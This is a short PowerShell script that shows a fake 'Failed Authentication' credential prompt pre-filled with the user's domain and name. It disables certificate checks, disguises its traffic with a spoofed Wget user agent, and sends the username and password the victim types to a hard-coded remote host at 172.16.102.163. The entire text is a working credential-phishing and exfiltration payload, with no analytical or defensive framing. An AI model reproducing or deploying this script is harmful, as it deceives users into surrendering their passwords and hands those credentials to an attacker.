$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
$result = $wc.downloadstring('https://172.16.102.163');